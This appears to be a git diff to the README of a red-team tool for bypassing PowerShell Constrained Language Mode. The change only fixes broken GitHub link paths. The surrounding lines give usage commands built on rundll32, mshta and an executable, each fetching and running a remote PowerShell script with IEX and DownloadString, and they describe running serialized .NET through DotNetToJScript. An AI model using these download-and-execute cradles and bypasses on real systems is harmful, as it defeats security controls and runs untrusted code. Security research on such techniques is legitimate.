@@ -11,18 +11,18 @@ Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https:
 
 -----
 
-### [CLMBypass.dll](https://github.com/stonepresto/CLMBypass/blobl/master/src/DLLProgram.cs)
+### [CLMBypass.dll](https://github.com/stonepresto/CLMBypass/blob/master/src/DLLProgram.cs)
 
 - Using the DllExport library and properly formatted functions, it is possible to exeucte DLLs with `rundll32.exe` and .NET Framework support, which allows the use of `System.Managment.Automation`
 - **Usage:** `rundll32.exe CLMBypass.dll,Run IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1');`
 
-### [CLMBypass.hta](https://github.com/stonepresto/CLMBypass/blobl/master/src/CLMBypass.hta)
+### [CLMBypass.hta](https://github.com/stonepresto/CLMBypass/blob/master/src/CLMBypass.hta)
 
 - The WScript.Shell creates a new runspace
 - `payload.ps1` is downloaded and executed in FullLanguage mode
 - **Usage:** `mshta.exe http://localhost/CLMBypass.hta`
 
-### [CLMBypass.exe](https://github.com/stonepresto/CLMBypass/blobl/master/src/Program.cs)
+### [CLMBypass.exe](https://github.com/stonepresto/CLMBypass/blob/master/src/Program.cs)
 
 - Compiled as PE32 .NET Framework 4.0
 - **Usage:** `.\CLMBypass.exe "IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')"`
@@ -125,7 +125,7 @@ But as previously mentioned, these are easily restricted and often are not enoug
 
 #### Method 2.2: JavaScript shenanigans
 
-Well, as it turns out, Microsoft Windows loves to be backwards compatible. This means including a lot of binaries that do not get used very often, including `mshta.exe` which is part of the [deprecated](https://www.microsoft.com/en-us/windowsforbusiness/end-of-ie-support) Internet Explorer. If the GPO does not block using scripts, it is easy enough to use [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) to JavaScript-ify an executable by creating serialized data, encoding it in base64, and then deserializing it and running it after being "formatted" as a binary. [Here](https://github.com/stonepresto/CLMBypass/blobl/master/src/CLMBypass.js) is an example, but the relevant snippet is below...
+Well, as it turns out, Microsoft Windows loves to be backwards compatible. This means including a lot of binaries that do not get used very often, including `mshta.exe` which is part of the [deprecated](https://www.microsoft.com/en-us/windowsforbusiness/end-of-ie-support) Internet Explorer. If the GPO does not block using scripts, it is easy enough to use [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) to JavaScript-ify an executable by creating serialized data, encoding it in base64, and then deserializing it and running it after being "formatted" as a binary. [Here](https://github.com/stonepresto/CLMBypass/blob/master/src/CLMBypass.js) is an example, but the relevant snippet is below...
 
 ```js
 var stm = base64ToStream(serialized_obj);
